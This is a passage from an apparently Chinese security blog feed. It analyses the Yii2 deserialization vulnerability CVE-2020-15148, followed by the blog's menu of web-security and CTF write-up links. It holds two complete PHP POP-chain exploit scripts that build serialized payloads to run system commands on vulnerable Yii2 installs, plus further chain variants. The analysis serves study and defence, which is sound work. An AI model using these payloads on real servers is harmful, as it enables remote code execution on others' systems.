class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Deprecated</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Deprecated</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Deprecated();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(<span class="string">&quot;just&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;for&quot;</span>=&gt;<span class="string">&quot;ca01h&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然报错，但命令还是成功执行了。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008174414.png" alt=""></p><p>与此类似的POP链还有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\See.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Description.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><h3 id="第三条POP链">第三条POP链</h3><blockquote><p>PHP &gt; 7.1</p></blockquote><p>再来一个从<code>__wakeup</code>入手的POP链，反序列化起点位于<code>vendor\symfony\string\UnicodeString.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213827.png" alt=""></p><p>继续跟<code>normalizer_is_normalized()</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213922.png" alt=""></p><p>跟进静态方法<code>isNormalized()</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214024.png" alt=""></p><p>看到<code>preg_match($s)</code>，那么``normalizer_is_normalized()<code>就可以作为跳板触发</code>__toString()`方法，接下来又可以和上面提到的POP链连在一起了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\String\UnicodeString::__wakeup()</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;touch test.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $string;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string = <span class="keyword">new</span> See;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> UnicodeString()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个问题是这个POP利用链回显的时候会报错，不能正常显示。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214536.png" alt=""></p><p>但是命令是成功执行的：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214737.png" style="zoom:50%;" /><p>讲道理，应该还可以接着挖。</p><h2 id="参考文章">参考文章</h2><p><a href="https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg">https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg</a></p><p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p><p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2020-15148-Yii2-反序列化分析及拓展&quot;&gt;CVE-2020-15148 Yii2 反序列化分析及拓展&lt;/h1&gt;
&lt;h2 id=&quot;漏洞范围&quot;&gt;漏洞范围&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Yii2 &amp;lt; 2.0.38&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>menu</title>
    <link href="http://ca0y1h.top/menu/"/>
    <id>http://ca0y1h.top/menu/</id>
    <published>2020-09-26T11:57:04.681Z</published>
    <updated>2020-12-19T13:46:20.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1><h1 id="置顶文章"><strong>置顶文章</strong></h1><ul><li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li></ul><h1 id="Web安全"><strong>Web安全</strong></h1><h2 id="Web安全基础">Web安全基础</h2><ul><li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li><li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li><li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li><li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li><li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li><li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li><li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li><li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li><li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li><li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li><li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li><li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li><li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li><li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li><li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li><li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li><li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li><li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li><li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li><li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li><li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li><li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li><li><a href="/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93">MySQL攻击面和提权总结</a></li><li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQL注入手册</a></li><li><a href="/Web_security/basic_learning/28.Jinja2%E7%9A%84SSTI+Bypass">Jinja2 SSTI&amp;Bypass</a></li></ul><h2 id="PHP相关">PHP相关</h2><ul><li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li><li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li><li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li><li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li><li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li><li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li><li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li><li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li><li><a href="/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90">PHP复杂变量解析</a></li><li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li><li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li></ul><h2 id="Writeups">Writeups</h2><ul><li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li><li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li><li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li><li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li><li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li><li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li><li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li><li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li><li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li><li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li><li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li><li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li><li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li><li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li><li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShow—Web入门</a></li><li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li><li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li><li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li><li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li><li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li><li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li><li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li><li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li><li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li><li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li><li><a href="/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups">羊城杯2020 Web</a></li><li><a href="/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything">NCTF2019 Phar matches everything</a></li></ul><h1 id="靶机系列"><strong>靶机系列</strong></h1><h2 id="HackTheBox">HackTheBox</h2><ul><li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li><li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li><li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li><li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li><li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li><li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li><li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li><li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li><li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li><li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li><li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li><li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li><li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li><li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li><li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li><li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li><li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li><li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li></ul><h2 id="VulnHub">VulnHub</h2><ul><li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li><li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li><li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li></ul><h1 id="代码审计"><strong>代码审计</strong></h1><h2 id="PHP代码审计">PHP代码审计</h2><ul><li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li><li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li><li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li><li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li><li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li><li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li><li><a 